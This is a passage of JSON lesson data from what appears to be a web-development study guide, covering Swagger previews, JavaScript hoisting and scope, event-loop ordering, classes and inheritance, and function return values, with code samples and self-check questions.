\u003ccode\u003eswagger.json\u003c/code\u003e in VS Code and run \u003cstrong\u003ePreview Swagger\u003c/strong\u003e (Shift + Alt + P). VS Code renders the interactive documentation panel directly.","text":"**Step 3 — Open and preview.** Open your `swagger.json` in VS Code and run **Preview Swagger** (Shift + Alt + P). VS Code renders the interactive documentation panel directly."},{"kind":"p","html":"\u003cstrong\u003eStep 4 — Customize.\u003c/strong\u003e Modify the \u003ccode\u003epaths\u003c/code\u003e section to match your project&#39;s actual endpoints, parameters, and response shapes.","text":"**Step 4 — Customize.** Modify the `paths` section to match your project's actual endpoints, parameters, and response shapes."},{"kind":"h2","html":"What a path object looks like","text":"What a path object looks like"},{"kind":"p","html":"The \u003ccode\u003epaths\u003c/code\u003e key maps each endpoint URL to an object describing its HTTP methods:","text":"The `paths` key maps each endpoint URL to an object describing its HTTP methods:"},{"kind":"code","lang":"json","code":"{\n  \"/patients\": {\n    \"get\": {\n      \"summary\": \"Get all patients\",\n      \"responses\": {\n        \"200\": { \"description\": \"List of patients\" }\n      }\n    }\n  }\n}"},{"kind":"p","html":"Each HTTP method block can also include \u003ccode\u003eparameters\u003c/code\u003e (for query/path params) and \u003ccode\u003erequestBody\u003c/code\u003e (for POST/PUT payloads). The structure is hierarchical and consistent across all endpoints.","text":"Each HTTP method block can also include `parameters` (for query/path params) and `requestBody` (for POST/PUT payloads). The structure is hierarchical and consistent across all endpoints."},{"kind":"h2","html":"Retrieval checkpoint","text":"Retrieval checkpoint"},{"kind":"checkpoint","q":"What does a `swagger.json` file describe about an API endpoint?","a":"The path, the supported HTTP method(s), any request parameters or body schema, the possible response status codes and their schemas, and any authentication requirements."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eWriting a swagger.json from scratch produces invalid structure the first time almost every time. Start from the sample at editor.swagger.io — it gives you a structurally valid skeleton with correct \u003ccode\u003eopenapi\u003c/code\u003e, \u003ccode\u003einfo\u003c/code\u003e, and \u003ccode\u003epaths\u003c/code\u003e keys. Edit the \u003ccode\u003epaths\u003c/code\u003e block; don&#39;t rebuild the wrapper.\u003c/p\u003e","text":"Writing a swagger.json from scratch produces invalid structure the first time almost every time. Start from the sample at editor.swagger.io — it gives you a structurally valid skeleton with correct `openapi`, `info`, and `paths` keys. Edit the `paths` block; don't rebuild the wrapper."},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e OpenAPI / Swagger turns your API&#39;s implicit contract into an explicit, machine-readable \u003ccode\u003eswagger.json\u003c/code\u003e. Start from the editor.swagger.io sample, customize the \u003ccode\u003epaths\u003c/code\u003e block to match your project, and preview the result in VS Code with the Swagger Viewer extension.","text":"**Takeaway:** OpenAPI / Swagger turns your API's implicit contract into an explicit, machine-readable `swagger.json`. Start from the editor.swagger.io sample, customize the `paths` block to match your project, and preview the result in VS Code with the Swagger Viewer extension."}]},{"n":8,"id":"js-scope-hoisting","title":"var/let/const Scope and Hoisting","hook":"JavaScript reads your var declarations before it runs your code — and that silent move causes bugs that look impossible.","tags":["hoisting","var","let","const","scope","event-queue"],"module":"JavaScript Foundations and Web Basics","source":"Slide 1, Slide 3, ISAQuiz3, ISAQuiz6","blocks":[{"kind":"p","html":"Run this in your browser console:","text":"Run this in your browser console:"},{"kind":"code","lang":"js","code":"console.log(x); // undefined — not ReferenceError\nvar x = 5;\nconsole.log(x); // 5"},{"kind":"p","html":"The engine moves the \u003ccode\u003evar x\u003c/code\u003e declaration to the top of the enclosing function before execution starts. That move is hoisting. The initialization (\u003ccode\u003e= 5\u003c/code\u003e) stays where you wrote it. So \u003ccode\u003ex\u003c/code\u003e exists but holds \u003ccode\u003eundefined\u003c/code\u003e when the first \u003ccode\u003econsole.log\u003c/code\u003e runs.","text":"The engine moves the `var x` declaration to the top of the enclosing function before execution starts. That move is hoisting. The initialization (`= 5`) stays where you wrote it. So `x` exists but holds `undefined` when the first `console.log` runs."},{"kind":"h2","html":"How hoisting works","text":"How hoisting works"},{"kind":"p","html":"JavaScript&#39;s compiler pass scans for all \u003ccode\u003evar\u003c/code\u003e declarations in a function and registers them in the function scope before any line executes. Only the declaration moves — the assignment does not.","text":"JavaScript's compiler pass scans for all `var` declarations in a function and registers them in the function scope before any line executes. Only the declaration moves — the assignment does not."},{"kind":"code","lang":"js","code":"// What you write:\nfunction greet() {\n  console.log(msg); // undefined\n  var msg = \"hello\";\n  console.log(msg); // \"hello\"\n}\n\n// What the engine sees:\nfunction greet() {\n  var msg;           // hoisted declaration\n  console.log(msg); // undefined\n  msg = \"hello\";\n  console.log(msg); // \"hello\"\n}"},{"kind":"p","html":"\u003ccode\u003elet\u003c/code\u003e and \u003ccode\u003econst\u003c/code\u003e do \u003cstrong\u003enot\u003c/strong\u003e hoist to initialization. Accessing them before their declaration throws a \u003ccode\u003eReferenceError\u003c/code\u003e, not \u003ccode\u003eundefined\u003c/code\u003e. This zone between the block opening and the declaration is called the Temporal Dead Zone (TDZ).","text":"`let` and `const` do **not** hoist to initialization. Accessing them before their declaration throws a `ReferenceError`, not `undefined`. This zone between the block opening and the declaration is called the Temporal Dead Zone (TDZ)."},{"kind":"code","lang":"js","code":"console.log(y); // ReferenceError: Cannot access 'y' before initialization\nlet y = 10;"},{"kind":"h2","html":"Scope rules by keyword","text":"Scope rules by keyword"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKeyword\u003c/th\u003e\n\u003cth\u003eScope\u003c/th\u003e\n\u003cth\u003eHoisted?\u003c/th\u003e\n\u003cth\u003eRe-assignable?\u003c/th\u003e\n\u003cth\u003eRe-declarable?\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003evar\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eFunction (or global)\u003c/td\u003e\n\u003ctd\u003eDeclaration only\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003elet\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eBlock \u003ccode\u003e{}\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNo (TDZ)\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003econst\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eBlock \u003ccode\u003e{}\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNo (TDZ)\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"\u003cstrong\u003eBlock scope\u003c/strong\u003e means the variable only lives inside the nearest enclosing \u003ccode\u003e{}\u003c/code\u003e. Step outside that block and the variable is gone.","text":"**Block scope** means the variable only lives inside the nearest enclosing `{}`. Step outside that block and the variable is gone."},{"kind":"code","lang":"js","code":"if (true) {\n  let a = 5;\n  const b = 10;\n}\nconsole.log(a); // ReferenceError: a is not defined\nconsole.log(b); // ReferenceError: b is not defined"},{"kind":"h2","html":"The assignment-expression trap","text":"The assignment-expression trap"},{"kind":"p","html":"\u003ccode\u003evar\u003c/code\u003e hoisting interacts with assignment expressions in conditions:","text":"`var` hoisting interacts with assignment expressions in conditions:"},{"kind":"code","lang":"js","code":"if (m = []) {\n  console.log(\"Green\"); // prints \"Green\"\n}\nvar m = 10;"},{"kind":"p","html":"\u003ccode\u003evar m\u003c/code\u003e is hoisted, so \u003ccode\u003em\u003c/code\u003e exists as \u003ccode\u003eundefined\u003c/code\u003e at the top. \u003ccode\u003em = []\u003c/code\u003e is an assignment expression — it assigns \u003ccode\u003e[]\u003c/code\u003e to \u003ccode\u003em\u003c/code\u003e and evaluates to \u003ccode\u003e[]\u003c/code\u003e, which is truthy. The \u003ccode\u003eif\u003c/code\u003e body runs. Students expect a \u003ccode\u003eReferenceError\u003c/code\u003e because \u003ccode\u003evar m = 10\u003c/code\u003e appears after the \u003ccode\u003eif\u003c/code\u003e, but hoisting moves the declaration above it.","text":"`var m` is hoisted, so `m` exists as `undefined` at the top. `m = []` is an assignment expression — it assigns `[]` to `m` and evaluates to `[]`, which is truthy. The `if` body runs. Students expect a `ReferenceError` because `var m = 10` appears after the `if`, but hoisting moves the declaration above it."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003evar\u003c/code\u003e hoists the \u003cstrong\u003edeclaration\u003c/strong\u003e only. Reading \u003ccode\u003ex\u003c/code\u003e before \u003ccode\u003evar x = 5\u003c/code\u003e returns \u003ccode\u003eundefined\u003c/code\u003e — not a \u003ccode\u003eReferenceError\u003c/code\u003e. Expecting an error here is the most common exam mistake. \u003ccode\u003elet\u003c/code\u003e and \u003ccode\u003econst\u003c/code\u003e are different: they throw \u003ccode\u003eReferenceError\u003c/code\u003e if you access them before their line in the block.\u003c/p\u003e","text":"`var` hoists the **declaration** only. Reading `x` before `var x = 5` returns `undefined` — not a `ReferenceError`. Expecting an error here is the most common exam mistake. `let` and `const` are different: they throw `ReferenceError` if you access them before their line in the block."},{"kind":"checkpoint","q":"What does this print?\n```js\nconsole.log(test);\nvar test = 'hello';\n```\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"`undefined`. The declaration `var test` is hoisted; the initialization `= 'hello'` is not. At the `console.log` line, `test` exists in scope but has never been assigned, so its value is `undefined`.\n\u003c/details\u003e"},{"kind":"h2","html":"Functions without return","text":"Functions without return"},{"kind":"p","html":"A function that reaches its closing brace without hitting a \u003ccode\u003ereturn\u003c/code\u003e statement returns \u003ccode\u003eundefined\u003c/code\u003e.","text":"A function that reaches its closing brace without hitting a `return` statement returns `undefined`."},{"kind":"code","lang":"js","code":"function sum(n) {\n  var s = 0;\n  for (let i = 0; i \u003c n; i++) {\n    s += i;\n  }\n  // no return\n}\nconsole.log(sum(3)); // undefined"},{"kind":"p","html":"\u003ccode\u003es\u003c/code\u003e holds \u003ccode\u003e3\u003c/code\u003e inside the function, but \u003ccode\u003econsole.log(sum(3))\u003c/code\u003e prints \u003ccode\u003eundefined\u003c/code\u003e because the function never returns \u003ccode\u003es\u003c/code\u003e.","text":"`s` holds `3` inside the function, but `console.log(sum(3))` prints `undefined` because the function never returns `s`."},{"kind":"checkpoint","q":"Why does `console.log(foo(3))` print `undefined` when `foo` computes a result internally?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"Every function implicitly returns `undefined` unless a `return` statement with a value is reached. The computed value stays trapped inside the function's scope.\n\u003c/details\u003e"},{"kind":"h2","html":"The event loop","text":"The event loop"},{"kind":"p","html":"JavaScript is single-threaded non-blocking. One call stack processes all code. Long I/O operations (network, file) are delegated to the OS. When they finish, their callbacks wait in a queue. The event loop dequeues a callback only when the call stack is empty.","text":"JavaScript is single-threaded non-blocking. One call stack processes all code. Long I/O operations (network, file) are delegated to the OS. When they finish, their callbacks wait in a queue. The event loop dequeues a callback only when the call stack is empty."},{"kind":"code","lang":"text","code":"Call Stack        Callback Queue       Microtask Queue\n-----------       ---------------      ----------------\nmain()            setTimeout cb        Promise.then cb\n  fetch(...)      ──(waits)──►         ──(drains first)──►"},{"kind":"p","html":"The microtask queue (resolved Promise callbacks) drains completely before the event loop picks the next macrotask from the callback queue.","text":"The microtask queue (resolved Promise callbacks) drains completely before the event loop picks the next macrotask from the callback queue."},{"kind":"mermaid","source":"sequenceDiagram\n    participant Stack as Call Stack\n    participant Micro as Microtask Queue\n    participant Macro as Callback Queue\n    Stack-\u003e\u003eStack: Run synchronous code\n    Stack-\u003e\u003eMicro: Promise resolves → enqueue .then()\n    Stack-\u003e\u003eMacro: setTimeout fires → enqueue callback\n    Stack--\u003e\u003eStack: Stack empties\n    Micro--\u003e\u003eStack: Drain all microtasks\n    Macro--\u003e\u003eStack: Pick next macrotask"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003esetTimeout(fn, 0)\u003c/code\u003e does NOT run \u003ccode\u003efn\u003c/code\u003e immediately after the current line. It queues \u003ccode\u003efn\u003c/code\u003e as a macrotask. Any Promise \u003ccode\u003e.then()\u003c/code\u003e callbacks run before \u003ccode\u003efn\u003c/code\u003e, even if the Promise resolved after \u003ccode\u003esetTimeout\u003c/code\u003e was registered.\u003c/p\u003e","text":"`setTimeout(fn, 0)` does NOT run `fn` immediately after the current line. It queues `fn` as a macrotask. Any Promise `.then()` callbacks run before `fn`, even if the Promise resolved after `setTimeout` was registered."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e \u003ccode\u003evar\u003c/code\u003e declarations are hoisted to function scope — read them before assignment and you get \u003ccode\u003eundefined\u003c/code\u003e, not an error. \u003ccode\u003elet\u003c/code\u003e/\u003ccode\u003econst\u003c/code\u003e are block-scoped and throw \u003ccode\u003eReferenceError\u003c/code\u003e in the TDZ. Functions return \u003ccode\u003eundefined\u003c/code\u003e by default. The event loop drains the microtask queue before each macrotask.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":9,"id":"js-async-event-loop","title":"The Event Loop: How JavaScript Stays Non-Blocking","hook":"Four lines of code, two surprises: the number you expect last prints first.","tags":["async","single-thread","non-blocking","event-loop","setTimeout"],"module":"JavaScript Foundations and Web Basics","source":"Slide 4, ISAQuiz6, ISAQuiz8","blocks":[{"kind":"p","html":"Run this code and predict the output before reading on:","text":"Run this code and predict the output before reading on:"},{"kind":"code","lang":"js","code":"setTimeout(function() {\n  console.log(1);\n  console.log(2);\n  console.log(3);\n}, 500);\nconsole.log(4);"},{"kind":"p","html":"Output: \u003ccode\u003e4\u003c/code\u003e, then \u003ccode\u003e1\u003c/code\u003e, \u003ccode\u003e2\u003c/code\u003e, \u003ccode\u003e3\u003c/code\u003e. The synchronous \u003ccode\u003econsole.log(4)\u003c/code\u003e fires immediately. The \u003ccode\u003esetTimeout\u003c/code\u003e callback waits at least 500 ms in the macrotask queue, then runs only after the call stack is empty.","text":"Output: `4`, then `1`, `2`, `3`. The synchronous `console.log(4)` fires immediately. The `setTimeout` callback waits at least 500 ms in the macrotask queue, then runs only after the call stack is empty."},{"kind":"h2","html":"The single-threaded non-blocking model","text":"The single-threaded non-blocking model"},{"kind":"p","html":"JavaScript runs on a single thread. One thread means one thing executes at a time — no parallel execution. &quot;Non-blocking&quot; means that thread never sits idle waiting for I/O.","text":"JavaScript runs on a single thread. One thread means one thing executes at a time — no parallel execution. \"Non-blocking\" means that thread never sits idle waiting for I/O."},{"kind":"p","html":"Think of a restaurant with one waiter. That waiter takes your order, hands it to the kitchen (the OS), and immediately serves other tables. When the kitchen is done, the waiter picks up and delivers. The waiter never stands at the pass waiting.","text":"Think of a restaurant with one waiter. That waiter takes your order, hands it to the kitchen (the OS), and immediately serves other tables. When the kitchen is done, the waiter picks up and delivers. The waiter never stands at the pass waiting."},{"kind":"p","html":"Node.js works the same way. The V8 engine compiles your JS to native machine code and executes it on one thread. When your code hits a file read or network request, Node.js delegates that work to the operating system. The OS signals completion; Node.js resumes via a callback.","text":"Node.js works the same way. The V8 engine compiles your JS to native machine code and executes it on one thread. When your code hits a file read or network request, Node.js delegates that work to the operating system. The OS signals completion; Node.js resumes via a callback."},{"kind":"p","html":"Contrast this with a thread-per-request model. One hundred simultaneous requests spawn one hundred threads. Each thread blocks waiting for its I/O. The single-thread async model handles those same one hundred requests on one thread — no blocking, no idle waste.","text":"Contrast this with a thread-per-request model. One hundred simultaneous requests spawn one hundred threads. Each thread blocks waiting for its I/O. The single-thread async model handles those same one hundred requests on one thread — no blocking, no idle waste."},{"kind":"h2","html":"The event loop mechanism","text":"The event loop mechanism"},{"kind":"p","html":"The event loop coordinates three structures: the call stack, the microtask queue, and the macrotask queue.","text":"The event loop coordinates three structures: the call stack, the microtask queue, and the macrotask queue."},{"kind":"mermaid","source":"graph LR\n    A[Call Stack] --\u003e|empty| B[Event Loop]\n    B --\u003e C[\"Microtask Queue\\n(Promise .then callbacks)\"]\n    B --\u003e D[\"Macrotask Queue\\n(setTimeout, setInterval, I/O)\"]\n    C --\u003e|drain all| A\n    D --\u003e|one task| A"},{"kind":"p","html":"The event loop follows this exact cycle on every tick:","text":"The event loop follows this exact cycle on every tick:"},{"kind":"p","html":"\u003col\u003e\n\u003cli\u003eRun the current synchronous code to completion (the call stack drains).\u003c/li\u003e\n\u003cli\u003eDrain the \u003cstrong\u003eentire\u003c/strong\u003e microtask queue — every resolved-Promise \u003ccode\u003e.then()\u003c/code\u003e callback runs.\u003c/li\u003e\n\u003cli\u003ePull \u003cstrong\u003eone\u003c/strong\u003e task from the macrotask queue and run it.\u003c/li\u003e\n\u003cli\u003eRepeat.\u003c/li\u003e\n\u003c/ol\u003e","text":"1. Run the current synchronous code to completion (the call stack drains).\n2. Drain the **entire** microtask queue — every resolved-Promise `.then()` callback runs.\n3. Pull **one** task from the macrotask queue and run it.\n4. Repeat."},{"kind":"p","html":"\u003ccode\u003esetTimeout\u003c/code\u003e and \u003ccode\u003esetInterval\u003c/code\u003e are Web APIs. Calling \u003ccode\u003esetTimeout(fn, 500)\u003c/code\u003e hands \u003ccode\u003efn\u003c/code\u003e to the browser/Node.js runtime, which schedules it as a macrotask after at least 500 ms. \u003ccode\u003eforEach\u003c/code\u003e and \u003ccode\u003econsole.log\u003c/code\u003e are synchronous — they run inline on the call stack with no queuing.","text":"`setTimeout` and `setInterval` are Web APIs. Calling `setTimeout(fn, 500)` hands `fn` to the browser/Node.js runtime, which schedules it as a macrotask after at least 500 ms. `forEach` and `console.log` are synchronous — they run inline on the call stack with no queuing."},{"kind":"h2","html":"Microtasks beat macrotasks","text":"Microtasks beat macrotasks"},{"kind":"code","lang":"js","code":"setTimeout(function() {\n  console.log(1);\n}, 1);\n\nnew Promise(function(resolve) {\n  console.log(2); // executor — runs eagerly, sync\n  resolve();\n}).then(function() {\n  console.log(4); // microtask\n});\n\nconsole.log(3); // sync"},{"kind":"p","html":"Output: \u003ccode\u003e2\u003c/code\u003e, \u003ccode\u003e3\u003c/code\u003e, \u003ccode\u003e4\u003c/code\u003e, \u003ccode\u003e1\u003c/code\u003e.","text":"Output: `2`, `3`, `4`, `1`."},{"kind":"p","html":"Trace the execution:","text":"Trace the execution:"},{"kind":"p","html":"\u003col\u003e\n\u003cli\u003e\u003ccode\u003esetTimeout\u003c/code\u003e registers its callback as a macrotask. Control moves on.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003enew Promise(executor)\u003c/code\u003e runs the executor \u003cstrong\u003eimmediately\u003c/strong\u003e — \u003ccode\u003econsole.log(2)\u003c/code\u003e fires now.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eresolve()\u003c/code\u003e enqueues the \u003ccode\u003e.then\u003c/code\u003e callback to the microtask queue.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econsole.log(3)\u003c/code\u003e runs — still sync.\u003c/li\u003e\n\u003cli\u003eCall stack empties. The event loop drains the microtask queue: \u003ccode\u003econsole.log(4)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eOnly now does the macrotask fire: \u003ccode\u003econsole.log(1)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e","text":"1. `setTimeout` registers its callback as a macrotask. Control moves on.\n2. `new Promise(executor)` runs the executor **immediately** — `console.log(2)` fires now.\n3. `resolve()` enqueues the `.then` callback to the microtask queue.\n4. `console.log(3)` runs — still sync.\n5. Call stack empties. The event loop drains the microtask queue: `console.log(4)`.\n6. Only now does the macrotask fire: `console.log(1)`."},{"kind":"checkpoint","q":"Given this code, what is the output and why?\n```js\nconst fn1 = () =\u003e new Promise((resolve, reject) =\u003e {\n  console.log(1);\n  resolve('success');\n});\nfn1().then((res) =\u003e {\n  console.log(res);\n});\nconsole.log('start');\n```\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"`1`, `start`, `success`.\nThe Promise executor runs eagerly when `fn1()` is called — `console.log(1)` fires immediately. `resolve('success')` enqueues the `.then` callback as a microtask. `console.log('start')` runs next (still sync). When the stack empties, the microtask queue drains: the `.then` callback logs `success`.\n\u003c/details\u003e"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003e.then()\u003c/code\u003e does not run the moment \u003ccode\u003eresolve()\u003c/code\u003e is called. \u003ccode\u003eresolve()\u003c/code\u003e only \u003cem\u003eenqueues\u003c/em\u003e the callback. The callback runs after every synchronous statement in the current call stack has executed. Students who assume \u003ccode\u003e.then()\u003c/code\u003e fires inline consistently get exam questions on Promise ordering wrong.\u003c/p\u003e","text":"`.then()` does not run the moment `resolve()` is called. `resolve()` only *enqueues* the callback. The callback runs after every synchronous statement in the current call stack has executed. Students who assume `.then()` fires inline consistently get exam questions on Promise ordering wrong."},{"kind":"p","html":"A second trap: if the executor never calls \u003ccode\u003eresolve()\u003c/code\u003e or \u003ccode\u003ereject()\u003c/code\u003e, the Promise stays pending forever. Every \u003ccode\u003e.then()\u003c/code\u003e chain attached to it is silently skipped.","text":"A second trap: if the executor never calls `resolve()` or `reject()`, the Promise stays pending forever. Every `.then()` chain attached to it is silently skipped."},{"kind":"code","lang":"js","code":"new Promise(function(resolve) {\n  console.log(1);\n  console.log(2);\n  // resolve never called\n}).then(() =\u003e console.log(3)).then(() =\u003e console.log(4));\n\nconsole.log(5);\n// Output: 1, 2, 5  — 3 and 4 never print"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Synchronous code always wins. Promise executors run eagerly (sync), \u003ccode\u003e.then()\u003c/code\u003e callbacks are microtasks (after sync), and \u003ccode\u003esetTimeout\u003c/code\u003e callbacks are macrotasks (after microtasks). Nail that ordering and event-loop exam questions become mechanical.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":10,"id":"js-oop","title":"OOP in JavaScript: Classes, Inheritance, and Composition","hook":"Three syntaxes create objects in JS — only one uses a blueprint you can extend.","tags":["OOP","classes","extends","super","composition"],"module":"JavaScript Foundations and Web Basics","source":"Slide 1, ISAQuiz4","blocks":[{"kind":"p","html":"JavaScript gives you three ways to create objects. Each has distinct syntax, and exams test whether you recognise which is which.","text":"JavaScript gives you three ways to create objects. Each has distinct syntax, and exams test whether you recognise which is which."},{"kind":"h2","html":"Object Literal","text":"Object Literal"},{"kind":"p","html":"The simplest form assigns key-value pairs directly inside braces:","text":"The simplest form assigns key-value pairs directly inside braces:"},{"kind":"code","lang":"js","code":"let sandwich = { bread: \"white\", filling: \"turkey\" };"},{"kind":"p","html":"No constructor, no \u003ccode\u003enew\u003c/code\u003e. You get exactly one object.","text":"No constructor, no `new`. You get exactly one object."},{"kind":"h2","html":"Constructor Function","text":"Constructor Function"},{"kind":"p","html":"A constructor function uses \u003ccode\u003ethis\u003c/code\u003e to attach properties, and \u003ccode\u003enew\u003c/code\u003e to create instances:","text":"A constructor function uses `this` to attach properties, and `new` to create instances:"},{"kind":"code","lang":"js","code":"function Person(first, last) {\n  this.first = first;\n  this.last = last;\n}\nlet p = new Person(\"Elon\", \"Musk\");"},{"kind":"p","html":"Call it without \u003ccode\u003enew\u003c/code\u003e and \u003ccode\u003ethis\u003c/code\u003e refers to the global object — a silent bug.","text":"Call it without `new` and `this` refers to the global object — a silent bug."},{"kind":"h2","html":"ES6 Class","text":"ES6 Class"},{"kind":"p","html":"A class wraps the constructor pattern in explicit syntax:","text":"A class wraps the constructor pattern in explicit syntax:"},{"kind":"code","lang":"js","code":"class Person {\n  constructor(first, last) {\n    this.first = first;\n    this.last = last;\n  }\n  greet() {\n    return `Hello, ${this.first}`;\n  }\n}\nlet p = new Person(\"Elon\", \"Musk\");"},{"kind":"p","html":"The \u003ccode\u003econstructor\u003c/code\u003e method runs automatically when you call \u003ccode\u003enew\u003c/code\u003e.","text":"The `constructor` method runs automatically when you call `new`."},{"kind":"h2","html":"Inheritance with \u003ccode\u003eextends\u003c/code\u003e and \u003ccode\u003esuper\u003c/code\u003e","text":"Inheritance with `extends` and `super`"},{"kind":"p","html":"A subclass inherits all methods from its parent and can add its own:","text":"A subclass inherits all methods from its parent and can add its own:"},{"kind":"code","lang":"js","code":"class Student extends Person {\n  constructor(first, last, gpa) {\n    super(first, last);   // must come before any use of `this`\n    this.gpa = gpa;\n  }\n}\nlet s = new Student(\"Ada\", \"Lovelace\", 4.0);"},{"kind":"p","html":"\u003ccode\u003esuper(first, last)\u003c/code\u003e calls the parent constructor. Omitting it throws a \u003ccode\u003eReferenceError\u003c/code\u003e before \u003ccode\u003ethis\u003c/code\u003e is accessible.","text":"`super(first, last)` calls the parent constructor. Omitting it throws a `ReferenceError` before `this` is accessible."},{"kind":"h2","html":"Property Access","text":"Property Access"},{"kind":"p","html":"Two notations reach the same property:","text":"Two notations reach the same property:"},{"kind":"code","lang":"js","code":"let arr = [{ name: \"Ada\", gpa: 4.0 }];\narr[0][\"gpa\"];  // bracket notation\narr[0].gpa;     // dot notation — both return 4.0"},{"kind":"p","html":"Use bracket notation when the key is stored in a variable:","text":"Use bracket notation when the key is stored in a variable:"},{"kind":"code","lang":"js","code":"let key = \"gpa\";\narr[0][key];    // resolves to arr[0][\"gpa\"]"},{"kind":"p","html":"\u003ccode\u003eobj[arr[2]]\u003c/code\u003e uses the \u003cem\u003evalue\u003c/em\u003e of \u003ccode\u003earr[2]\u003c/code\u003e as the property key — not the index itself.","text":"`obj[arr[2]]` uses the *value* of `arr[2]` as the property key — not the index itself."},{"kind":"checkpoint","q":"What does `typeof []` return?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"`\"object\"`. Arrays are objects in JavaScript. `typeof` cannot distinguish them from plain objects.\n\u003c/details\u003e"},{"kind":"checkpoint","q":"Why does `obj.[moreNums]` throw a syntax error?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"You cannot combine dot notation with bracket notation. Use either `obj.moreNums` or `obj[moreNums]`.\n\u003c/details\u003e"},{"kind":"h2","html":"Composition","text":"Composition"},{"kind":"p","html":"Composition stores objects as properties of another object instead of using inheritance:","text":"Composition stores objects as properties of another object instead of using inheritance:"},{"kind":"code","lang":"js","code":"class Engine {\n  start() { return \"running\"; }\n}\nclass Car {\n  constructor() {\n    this.engine = new Engine();  // Car *has* an Engine\n  }\n}\nlet car = new Car();\ncar.engine.start();"},{"kind":"p","html":"Prefer composition when the relationship is &quot;has-a&quot; rather than &quot;is-a&quot;.","text":"Prefer composition when the relationship is \"has-a\" rather than \"is-a\"."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003etypeof []\u003c/code\u003e returns \u003ccode\u003e&quot;object&quot;\u003c/code\u003e, not \u003ccode\u003e&quot;array&quot;\u003c/code\u003e. Quiz 4 tested this directly. Always use \u003ccode\u003eArray.isArray(value)\u003c/code\u003e when you need to confirm something is an array.\u003c/p\u003e","text":"`typeof []` returns `\"object\"`, not `\"array\"`. Quiz 4 tested this directly. Always use `Array.isArray(value)` when you need to confirm something is an array."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Object Literal creates one object inline. Constructor and Class both use \u003ccode\u003enew\u003c/code\u003e and \u003ccode\u003ethis\u003c/code\u003e, but Class syntax makes inheritance explicit via \u003ccode\u003eextends\u003c/code\u003e and enforces \u003ccode\u003esuper()\u003c/code\u003e before \u003ccode\u003ethis\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":11,"id":"js-functions","title":"Function declarations, callbacks, first-class functions, closures","hook":"A function with no return statement still returns something — undefined — and that surprises most developers the first time they see it.","tags":["callbacks","higher-order","closures","return-types"],"module":"JavaScript Foundations and Web Basics","source":"Slide 3, ISAQuiz3, ISAQuiz6","blocks":[{"kind":"p","html":"Call a function, get a value back — unless the function has no \u003ccode\u003ereturn\u003c/code\u003e statement. In that case JavaScript automatically returns \u003ccode\u003eundefined\u003c/code\u003e. This default behavior breaks many assumptions and produces silent bugs.","text":"Call a function, get a value back — unless the function has no `return` statement. In that case JavaScript automatically returns `undefined`. This default behavior breaks many assumptions and produces silent bugs."},{"kind":"h2","html":"Parameters vs. arguments","text":"Parameters vs. arguments"},{"kind":"p","html":"A \u003cstrong\u003eparameter\u003c/strong\u003e is the variable name listed in the function definition. An \u003cstrong\u003eargument\u003c/strong\u003e is the actual value you supply at the call site.","text":"A **parameter** is the variable name listed in the function definition. An **argument** is the actual value you supply at the call site."},{"kind":"code","lang":"js","code":"function greet(name) {       // name is the parameter\n  return \"Hello, \" + name;\n}\ngreet(\"John\");               // \"John\" is the argument"},{"kind":"p","html":"These two words are not interchangeable. Quiz questions test exactly this distinction.","text":"These two words are not interchangeable. Quiz questions test exactly this distinction."},{"kind":"checkpoint","q":"In `function greet(name) { ... }`, which word describes `name` — parameter or argument?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"`name` is the **parameter**. It is the placeholder variable declared in the function signature. The value passed at the call site — e.g., `\"John\"` in `greet(\"John\")` — is the **argument**.\n\u003c/details\u003e"},{"kind":"h2","html":"What happens when there is no return","text":"What happens when there is no return"},{"kind":"p","html":"Every JavaScript function returns a value. If you omit the \u003ccode\u003ereturn\u003c/code\u003e statement, the return value is \u003ccode\u003eundefined\u003c/code\u003e.","text":"Every JavaScript function returns a value. If you omit the `return` statement, the return 